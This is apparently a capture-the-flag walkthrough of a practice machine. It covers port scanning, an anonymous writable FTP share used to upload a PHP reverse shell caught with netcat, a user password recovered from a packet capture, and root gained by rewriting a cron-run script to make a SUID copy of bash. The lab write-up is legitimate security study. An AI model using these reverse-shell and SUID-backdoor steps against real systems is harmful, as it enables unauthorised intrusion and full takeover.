@@ -1,0 +1,240 @@
+IP: 10.10.83.31
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+
+Nmap scan results:
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 11:20 IST
+Nmap scan report for 10.10.83.31
+Host is up (0.15s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
+|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.9.81.62
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
+|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
+|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Maintenance
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/9%OT=21%CT=1%CU=42628%PV=Y%DS=2%DC=T%G=Y%TM=5FA8D8C
+OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
+
+
+        <!--when are we gonna update this??-->
+
+
+FTP is writable so we can put something in it.
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.83.31
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Nov  9 11:40:47 2020
+URL_BASE: http://10.10.83.31/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.83.31/ ----
+==> DIRECTORY: http://10.10.83.31/files/                                                                                
++ http://10.10.83.31/index.html (CODE:200|SIZE:808)                                                                     
++ http://10.10.83.31/server-status (CODE:403|SIZE:276)
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# ftp 10.10.127.235
+Connected to 10.10.127.235.
+220 (vsFTPd 3.0.3)
+Name (10.10.127.235:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp
+-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
+226 Directory send OK.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> pwd
+257 "/ftp" is the current directory
+ftp> put akshay.txt
+local: akshay.txt remote: akshay.txt
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+9 bytes sent in 0.00 secs (84.5102 kB/s)
+ftp>
+
+
+
+http://10.10.127.235/files/ftp/
+
+http://10.10.127.235/files/ftp/akshay.txt
+
+Now we can upload a reverse shell over here.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+--2020-11-09 12:20:26--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.36.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.36.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5491 (5.4K) [text/plain]
+Saving to: 'php-reverse-shell.php'
+
+php-reverse-shell.php                          100%[====================================================================================================>]   5.36K  --.-KB/s    in 0s
+
+2020-11-09 12:20:27 (37.8 MB/s) - 'php-reverse-shell.php' saved [5491/5491]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# nano php-reverse-shell.php
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# ftp 10.10.127.235
+Connected to 10.10.127.235.
+220 (vsFTPd 3.0.3)
+Name (10.10.127.235:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> put php-reverse-shell.php
+local: php-reverse-shell.php remote: php-reverse-shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5492 bytes sent in 0.00 secs (51.8572 MB/s)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.127.235 36430
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 06:52:55 up 7 min,  0 users,  load average: 0.06, 0.47, 0.34
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+
+
+
+recipe.txt
+
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+
+
+What is the secret spicy soup recipe?
+-> love
+
+
+www-data@startup:/$ ssuu  lleennnniiee
+
+www-data@startup:/incidents$ ls -la
+total 40
+drwxr-xr-x  2 www-data www-data  4096 Nov  9 02:12 .
+drwxr-xr-x 26 root     root      4096 Nov  9 06:46 ..
+-rwxr-xr-x  1 www-data www-data 31224 Nov  9 02:12 suspicious.pcapng
+www-data@startup:/incidents$
+
+Lets get this thing into our machine.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup# wget http://10.10.127.235:8000/suspicious.pcapng
+--2020-11-09 12:32:04--  http://10.10.127.235:8000/suspicious.pcapng
+Connecting to 10.10.127.235:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31224 (30K) [application/octet-stream]
+Saving to: 'suspicious.pcapng'
+
+suspicious.pcapng                              100%[====================================================================================================>]  30.49K  --.-KB/s    in 0.1s
+
+2020-11-09 12:32:05 (205 KB/s) - 'suspicious.pcapng' saved [31224/31224]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/startup#
+
+After enumerating for a bit, I got this password that can be of lennie's
+Password: c4ntg3t3n0ughsp1c3
+
+www-data@startup:/incidents$ su lennie
+Password: c4ntg3t3n0ughsp1c3
+
+lennie@startup:/incidents$
+
+lennie@startup:/$ id
+uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
+lennie@startup:/$
+
+Ohh cool lets proceed with privilege escalation.
+Ok lets see what have we got.
+
+lennie@startup:~/scripts$ ls -la
+total 16
+drwxr-xr-x 2 root   root   4096 Nov  9 02:13 .
+drwx------ 4 lennie lennie 4096 Nov  9 07:34 ..
+-rwxr-xr-x 1 root   root     77 Nov  9 02:12 planner.sh
+-rw-r--r-- 1 root   root      1 Nov  9 07:36 startup_list.txt
+lennie@startup:~/scripts$
+
+
+lennie@startup:~/scripts$ cat planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$
+
+We can edit that print.sh as it is owned by lennie.
+
+lennie@startup:/etc$ ls -la print.sh
+-rwx------ 1 lennie lennie 43 Nov  9 07:29 print.sh
+lennie@startup:/etc$
+
+lennie@startup:/etc$ cat print.sh
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+lennie@startup:/etc$
+
+Change the contents of print.sh to a malicious script and wait for some time.
+You will find this gem in /tmp folder
+
+-rwsr-sr-x 1 root root 1037528 Nov  9 07:39 bash
+lennie@startup:/tmp$
+
+
+lennie@startup:/tmp$ ../bash -p
+
+bash-4.3# id
+uid=1002(lennie) gid=1002(lennie) euid=0(root) egid=0(root) groups=0(root),1002(lennie)
+
+Thank you.. Happy Hacking :)
